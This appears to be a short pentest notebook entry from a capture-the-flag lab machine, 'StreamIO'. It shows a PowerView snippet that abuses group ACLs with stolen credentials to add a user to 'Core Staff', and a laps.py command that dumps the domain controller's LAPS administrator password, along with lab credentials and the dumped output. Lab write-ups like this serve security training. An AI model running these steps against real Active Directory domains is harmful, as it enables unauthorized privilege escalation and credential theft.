### Assign user to a group
```powershell
Import-Module ./PowerView.ps1

$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('streamio\\JDgodd', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -principalidentity "streamio\\JDgodd"

Add-DomainGroupMember -Identity 'Core Staff' -Members 'streamio\\JDgodd' -Credential $Cred

net group 'Core Staff'
```
Examples:
[[StreamIO#dc6ecc]]

### ReadLAPSPassword
We can use the utility laps.py to read LAPS passwords:
```bash
python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb
LAPS Dumper - Running at 07-07-2022 13:57:05
DC &V@%DQ-wEwQ97A
```
[[StreamIO#^2cc182]]